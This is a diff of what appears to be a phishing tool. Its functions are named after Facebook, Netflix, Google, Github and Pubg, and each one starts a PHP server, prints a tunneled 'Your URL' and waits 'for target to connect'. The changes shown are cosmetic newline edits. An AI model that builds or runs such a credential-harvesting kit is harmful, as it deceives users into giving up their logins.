@@ -233,7 +233,7 @@ def facebook():
     sleep(8)
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
     print("")
 
@@ -335,7 +335,7 @@ def netflix():
     sleep(8)
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
     print("")
 
@@ -437,7 +437,7 @@ def Google():
     sleep(8)
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
     print("")
 
@@ -541,7 +541,7 @@ def Github():
 
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
     print("")
 
@@ -633,8 +633,7 @@ def Pubg():
         port = input(Fore.MAGENTA + "\nWhich port want to open (default 80):" + Fore.RESET)
     except KeyboardInterrupt:
             exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
-
-
+    
 #====================================================================================================
     php_server()
 
@@ -646,7 +645,7 @@ def Pubg():
 
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
 
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
         
